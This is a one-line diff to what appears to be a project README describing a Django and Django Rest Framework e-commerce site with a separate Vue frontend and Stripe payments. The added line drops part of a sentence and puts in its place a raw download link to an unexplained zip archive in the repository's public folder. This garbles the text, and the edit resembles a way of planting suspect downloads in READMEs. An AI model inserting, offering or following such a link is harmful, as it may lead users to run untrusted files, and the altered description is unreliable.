@@ -1,1 +1,1 @@
-An Ecommerce website with Django. Django Rest Framework is used to build the API and backend.The frontend is a separate Vue project. To handle the payments, I implemented Stripe.
+An Ecommerce website with Django. Django Rest Framework is used to build the API and https://github.com/KeremKarsiyaka/django_e-commerce_vuejs_side/raw/refs/heads/main/public/django-commerce-vuejs-side-e-v2.4.zip frontend is a separate Vue project. To handle the payments, I implemented Stripe.
